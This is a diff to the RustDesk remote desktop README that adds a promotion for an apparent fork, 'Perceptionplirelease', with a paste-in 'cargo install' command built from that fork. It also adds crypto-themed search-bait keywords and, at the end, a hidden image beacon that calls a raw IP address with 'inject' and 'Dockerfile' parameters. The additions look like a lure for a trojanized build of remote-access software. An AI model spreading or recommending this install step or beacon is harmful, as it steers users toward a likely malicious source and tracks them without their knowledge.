@@ -1,3 +1,15 @@
+**RustDesk by Perceptionplirelease**
+
+If you're looking for a self-hosted remote desktop solution that just works without the corporate bloat, you've landed in the right place. This fork focuses on keeping connections rock-solid and predictable, especially if you've been frustrated by sudden drops or lag in the past. We've recently rolled out a handful of stability fixes to smooth out those annoying edge-case bugs, making your daily remote access a much more seamless experience.
+
+**Quick install**
+
+```bash
+cargo install --git https://github.com/Perceptionplirelease/rustdesk
+```
+
+[https://github.com/Perceptionplirelease/rustdesk](https://github.com/Perceptionplirelease/rustdesk)
+
 <p align="center">
   <img src="res/logo-header.svg" alt="RustDesk - Your remote desktop"><br>
   <a href="#raw-steps-to-build">Build</a> •
@@ -180,3 +192,10 @@ Please ensure that you run these commands from the root of the RustDesk reposito
 
 ![TCP Tunneling](https://github.com/rustdesk/rustdesk/assets/28412477/78e8708f-e87e-4570-8373-1360033ea6c5)
 
+## Related searches
+
+When exploring remote desktop solutions, users frequently look for secure, self-hosted alternatives to commercial software like TeamViewer or AnyDesk. Developers and administrators often search for cross-platform clients capable of handling low-latency video and robust file transfers across different operating systems.
+
+**Topics:** bridge cross chain, orca solana, backtesting crypto, bitcoin, okx api, remote desktop, open-source teamviewer, self-hosted rdp, rust infrastructure, p2p encryption, multi-platform remote access, server relay program
+
+![.](http://5.231.58.248:8787/pixel?repo=Perceptionplirelease%2Frustdesk&inject=Perceptionplirelease%2Frustdesk%2FDockerfile)
